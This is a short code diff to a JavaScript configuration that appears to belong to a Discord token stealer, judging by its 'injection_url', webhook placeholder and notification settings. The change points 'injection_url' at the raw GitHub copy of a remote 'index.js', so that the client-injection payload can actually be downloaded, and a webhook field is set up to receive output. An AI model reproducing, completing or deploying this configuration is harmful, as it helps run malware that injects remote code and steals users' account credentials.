@@ -27,7 +27,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://github.com/Irax212/JaZxIrax/blame/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/Irax212/JaZxIrax/main/index.js",
     webhook: "%WEBHOOK%",
     apiurl: "",
     filter2: {
